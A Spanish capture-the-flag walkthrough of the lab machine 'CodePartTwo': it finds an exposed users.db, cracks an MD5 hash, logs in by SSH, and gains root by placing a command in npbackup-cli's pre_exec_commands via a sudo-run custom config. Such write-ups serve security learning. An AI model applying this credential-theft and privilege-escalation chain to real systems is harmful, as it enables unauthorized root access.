
# CodePartTwo

<figure><img src="/files/wSsQXIIElhaOnI1hP1ue" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `CodePartTwo`
* **IP:** `10.10.11.82`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `29/10/2025`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.82 " | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

```bash
sudo nmap -v -sV -T5 10.10.11.82
```

```bash
PORT     STATE SERVICE VERSION                                                                                       │
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)                                 │
│  ssh-hostkey:                                                                                                       │
│  3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)                                                       │
│  256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)                                                      │
│  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)                                                    │
4444/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)                                                          │
│  http-server-header: SimpleHTTP/0.6 Python/3.8.10                                                                   │
http-title: Directory listing for /                                                                                │
8000/tcp open  http    Gunicorn 20.0.4                                                                               │
│  http-server-header: gunicorn/20.0.4                                                                                │
│  http-title: Welcome to CodePartTwo                                                                                 │
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Análisis del escaneo Nmap:

* **Puerto 22 (SSH)**: OpenSSH 8.2p1. Es una versión moderna, es poco probable encontrar una vulnerabilidad directa. Lo guardo para más tarde si consigo credenciales.
* **Puerto 4444 (SimpleHTTPServer)**: Muy interesante. Un servidor HTTP simple de Python con el listado de directorios activado. Esto significa que puedo ver los archivos que está sirviendo. Es mi primera prioridad.
* **Puerto 8000 (Gunicorn)**: Una aplicación web llamada "CodePartTwo". Gunicorn es un servidor Python, lo que sugiere una aplicación web más compleja. Será mi segundo objetivo.

### Acceso Web

Accedemos por el puerto 8000 y observamos que parece ser un sandbox en desarrollo para ejecutar JavaScript. Podemos loguearnos, registrarnos y descargar la app. Vamos a registrarnos para ver el interior de la aplicación.

<figure><img src="/files/7WD3WiCVYKeacSnR80ao" alt=""><figcaption></figcaption></figure>

Llegamos al dashboard, donde podríamos probar distintos payloads de JavaScript:

<figure><img src="/files/wd4sSlH75BmtMdFE8hcw" alt=""><figcaption></figcaption></figure>

Despues de probar payloads típicos de NodeJS y JavaScript puro, encontramos que estamos ante un entorno bastante limitado que apenas pemite realizar conexiones, como reverse shells.

Con un payload como `Object.getOwnPropertyNames(this)`, descubrimos que **no es JavaScript puro**, sino un **sandbox híbrido que traduce resultados a Python**, y el error aparece al intentar “imprimirlo” en JSON o al retornar el valor.

Antes de testear la aplicación veremos el otro puerto abierto y que es bastante interesante.

***

## <mark style="color:purple;">Puerto 4444</mark>

Analizaremos con curl este puerto para ver su contenido, ya que tiene el directory listing habilitado:

```bash
curl http://10.10.11.82:4444/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href="users.db">users.db</a></li>
</ul>
<hr>
</body>
</html>
```

Encontramos un archivo de base de datos que puede contener usuarios y contraseñas, por lo que vamos a descargarlo para analizarlo en busca de contraseñas.

```bash
wget -O users.db http://10.10.11.82:4444/users.db

--2025-10-30 03:24:16--  http://10.10.11.82:4444/users.db
Conectando con 10.10.11.82:4444... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 16384 (16K) [application/octet-stream]
Grabando a: «users.db»

users.db            100%[================>]  16,00K  --.-KB/s    en 0,04s   

2025-10-30 03:24:16 (447 KB/s) - «users.db» guardado [16384/16384]
```

### Análisis de base de datos

Primero vamos a ver las tablas con sqlite3:

```bash
sqlite3 users.db '.tables'

code_snippet  user     
```

Vamos a ver la tabla user:

```bash
sqlite3 users.db 'SELECT * FROM user;'

1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

Bingo! Tenemos 2 hashes, uno de ellos del usuario marco que nos puede dar una vía de entrada directa por SSH.

### Cracking de hash

Con Crackstation conseguimos descifrar el hash rápidamente:

{% embed url="<https://crackstation.net/>" %}

<figure><img src="/files/5oDVxFFr5Wk5i4pcpXDt" alt=""><figcaption></figcaption></figure>

Tenemos la contraseña en plano del usuario marco: `sweetangelbabylove`

***

## <mark style="color:purple;">Acceso Inicial</mark>

```bash
ssh marco@10.10.11.82

marco@10.10.11.82's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

Last login: Wed Oct 29 19:29:36 2025 from 10.10.14.210
marco@codeparttwo:~$ 
```

Estamos dentro!

***

## <mark style="color:purple;">User Flag</mark>

En la home del usuario marco encontramos la user flag:

```bash
marco@codeparttwo:~$ ls
backups  npbackup.conf  user.txt

marco@codeparttwo:~$ cat user.txt 
59eb4689cd8949d3b96903a88*******
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

El resultado de sudo -l es claro: el usuario marco puede ejecutar el programa /usr/local/bin/npbackup-cli como cualquier usuario (incluyendo root) y sin necesidad de contraseña (NOPASSWD).

Mi objetivo ahora es abusar de este programa para obtener una shell de root.

```shell-session
marco@codeparttwo:~$ sudo -l

Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

Al ejecutarlo cons dice que no se puede usar isn una rchivo de configuración:

```shell-session
marco@codeparttwo:~$ ls
backups  npbackup.conf  user.txt

marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli
2025-10-29 19:42:10,980 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-10-29 19:42:10,980 :: CRITICAL :: Cannot run without configuration file.
2025-10-29 19:42:10,986 :: INFO :: ExecTime = 0:00:00.008445, finished, state is: critical.
```

### Menú de ayuda

Veremos que puede hacer este programa:

```shell-session
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli --help
usage: npbackup-cli [-h] [-c CONFIG_FILE] [--repo-name REPO_NAME] [--repo-group REPO_GROUP] [-b] [-f] [-r RESTORE] [-s] [--ls [LS]] [--find FIND] [--forget FORGET]
                    [--policy] [--housekeeping] [--quick-check] [--full-check] [--check CHECK] [--prune [PRUNE]] [--prune-max] [--unlock] [--repair-index]
                    [--repair-packs REPAIR_PACKS] [--repair-snapshots] [--repair REPAIR] [--recover] [--list LIST] [--dump DUMP] [--stats [STATS]] [--raw RAW]
                    [--init] [--has-recent-snapshot] [--restore-includes RESTORE_INCLUDES] [--snapshot-id SNAPSHOT_ID] [--json] [--stdin]
                    [--stdin-filename STDIN_FILENAME] [-v] [-V] [--dry-run] [--no-cache] [--license] [--auto-upgrade] [--log-file LOG_FILE] [--show-config]
                    [--external-backend-binary EXTERNAL_BACKEND_BINARY] [--group-operation GROUP_OPERATION] [--create-key CREATE_KEY]
                    [--create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK] [--create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK]
                    [--check-config-file]

Portable Network Backup Client This program is distributed under the GNU General Public License and comes with ABSOLUTELY NO WARRANTY. This is free software, and you
are welcome to redistribute it under certain conditions; Please type --license for more info.

optional arguments:
  -h, --help            show this help message and exit
  -c CONFIG_FILE, --config-file CONFIG_FILE
                        Path to alternative configuration file (defaults to current dir/npbackup.conf)
  --repo-name REPO_NAME
                        Name of the repository to work with. Defaults to 'default'. This can also be a comma separated list of repo names. Can accept special name
                        '__all__' to work with all repositories.
  --repo-group REPO_GROUP
                        Comme separated list of groups to work with. Can accept special name '__all__' to work with all repositories.
  -b, --backup          Run a backup
  -f, --force           Force running a backup regardless of existing backups age
  -s, --snapshots       Show current snapshots
  --ls [LS]             Show content given snapshot. When no snapshot id is given, latest is used
  --find FIND           Find full path of given file / directory
  --forget FORGET       Forget given snapshot (accepts comma separated list of snapshots)
  --policy              Apply retention policy to snapshots (forget snapshots)
  --housekeeping        Run --check quick, --policy and --prune in one go
  --quick-check         Deprecated in favor of --'check quick'. Quick check repository
  --full-check          Deprecated in favor of '--check full'. Full check repository (read all data)
  --check CHECK         Checks the repository. Valid arguments are 'quick' (metadata check) and 'full' (metadata + data check)
  --prune [PRUNE]       Prune data in repository, also accepts max parameter in order prune reclaiming maximum space
  --prune-max           Deprecated in favor of --prune max
  --unlock              Unlock repository
  --repair-index        Deprecated in favor of '--repair index'.Repair repo index
  --repair-packs REPAIR_PACKS
                        Deprecated in favor of '--repair packs'. Repair repo packs ids given by --repair-packs
  --repair-snapshots    Deprecated in favor of '--repair snapshots'.Repair repo snapshots
  --repair REPAIR       Repair the repository. Valid arguments are 'index', 'snapshots', or 'packs'
  --recover             Recover lost repo snapshots
  --list LIST           Show [blobs|packs|index|snapshots|keys|locks] objects
  --dump DUMP           Dump a specific file to stdout (full path given by --ls), use with --dump [file], add --snapshot-id to specify a snapshot other than latest
  --stats [STATS]       Get repository statistics. If snapshot id is given, only snapshot statistics will be shown. You may also pass "--mode raw-data" or "--mode
                        debug" (with double quotes) to get full repo statistics
  --raw RAW             Run raw command against backend. Use with --raw "my raw backend command"
  --init                Manually initialize a repo (is done automatically on first backup)
  --has-recent-snapshot
                        Check if a recent snapshot exists
  --restore-includes RESTORE_INCLUDES
                        Restore only paths within include path, comma separated list accepted
  --snapshot-id SNAPSHOT_ID
                        Choose which snapshot to use. Defaults to latest
  --json                Run in JSON API mode. Nothing else than JSON will be printed to stdout
  --stdin               Backup using data from stdin input
  --stdin-filename STDIN_FILENAME
                        Alternate filename for stdin, defaults to 'stdin.data'
  -v, --verbose         Show verbose output
  -V, --version         Show program version
  --dry-run             Run operations in test mode, no actual modifications
  --no-cache            Run operations without cache
  --license             Show license
  --auto-upgrade        Auto upgrade NPBackup
  --log-file LOG_FILE   Optional path for logfile
  --show-config         Show full inherited configuration for current repo. Optionally you can set NPBACKUP_MANAGER_PASSWORD env variable for more details.
  --external-backend-binary EXTERNAL_BACKEND_BINARY
                        Full path to alternative external backend binary
  --group-operation GROUP_OPERATION
                        Deprecated command to launch operations on multiple repositories. Not needed anymore. Replaced by --repo-name x,y or --repo-group x,y
  --create-key CREATE_KEY
                        Create a new encryption key, requires a file path
  --create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK
                        Create a scheduled backup task, specify an argument interval via interval=minutes, or hour=hour,minute=minute for a daily task
  --create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK
                        Create a scheduled housekeeping task, specify hour=hour,minute=minute for a daily task
  --check-config-file   Check if config file is valid
```

La salida de --help es enorme, pero contiene las claves para la explotación:

1. `--dump [archivo]`: "Vuelca un archivo específico a la salida estándar". Parece una vulnerabilidad de lectura de archivos arbitraria. Intentaré leer `/root/root.txt` directamente.
2. `--raw [comando]`: "Ejecuta un comando crudo contra el backend". Esto suena a inyección de comandos directa. Podría usarlo para ejecutar /bin/bash y obtener una shell de root.

Haciendo pruebas las opciones 1 y 2 fallan por lo que usaré otra opción.

### Plan de escalada final

#### Crear un script malicioso

Escribiré un script simple en `/tmp/shell.sh` en la máquina víctima. Este script contendrá un único comando: `cat /root/root.txt`.

```bash
marco@codeparttwo:/tmp$ cat shell.sh

cat /root/root.txt
```

Le daré permisos de ejecución al script con `chmod +x`.

```shell-session
marco@codeparttwo:/tmp$ chmod +x shell.sh
```

#### Editar archivo de configuración

Copiaré el archivo de configuración original a `/tmp/exploit.conf` para trabajar sobre una copia limpia.&#x20;

```bash
cp /home/marco/npbackup.conf /tmp/exploit.conf
```

En lugar de insertar una nueva línea, voy a reemplazar la línea `pre_exec_commands: []` por `pre_exec_commands: ["cat /root/root.txt"]`.

```bash
nano /tmp/exploit.conf

<---SNIP--->
pre_exec_commands: []
pre_exec_per_command_timeout: 3600
pre_exec_failure_is_fatal: false
post_exec_commands: []
post_exec_per_command_timeout: 3600
post_exec_failure_is_fatal: false
```

Editamos la línea `pre_exec_commands` por:

```
pre_exec_commands: ["cat /root/root.txt"]
```

***

## 👑 <mark style="color:purple;">Root Flag</mark>

Ejecutamos npbackup-cli indicándole:

* `-c` - El archivo de configuración malicioso
* `-b` - Para realizar el backup
* `-f` - para forzar el backup

```bash
marco@codeparttwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c /tmp/exploit.conf -b -f

2025-10-29 20:08:32,294 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-10-29 20:08:32,322 :: INFO :: Loaded config 78F07BE3 in /tmp/exploit.conf
2025-10-29 20:08:32,333 :: INFO :: Running backup of ['/home/app/app/'] to repo default
2025-10-29 20:08:32,388 :: INFO :: Pre-execution of command cat /root/root.txt succeeded with:
0314b2c80f5b224efa8f3c18a5*******
```

Y obtenemos la root flag!

***

## <mark style="color:purple;">Resumen del ataque</mark>

1. Escaneo: Se identificaron los puertos 22 (SSH), 4444 (HTTP) y 8000 (HTTP).
2. Enumeración: Se encontró un archivo users.db en el puerto 4444.
3. Análisis: El archivo users.db era una base de datos SQLite que contenía hashes MD5 para los usuarios marco y app.
4. Ruptura de Hash: Se rompió el hash de marco con John the Ripper, revelando la contraseña sweetangelbabylove.
5. Acceso Inicial: Se usaron las credenciales marco:sweetangelbabylove para obtener acceso a la máquina vía SSH. Se capturó la flag de usuario.
6. Escalada de Privilegios: Se descubrió que marco podía ejecutar /usr/local/bin/npbackup-cli como root sin contraseña.
7. Explotación: Tras varios intentos fallidos, se descubrió que el programa ejecutaba comandos definidos en su archivo de configuración (pre\_exec\_commands) antes de un backup. Se creó una configuración maliciosa que ejecutaba cat /root/root.txt y se forzó la ejecución de un backup (-b -f), lo que reveló la flag de root.
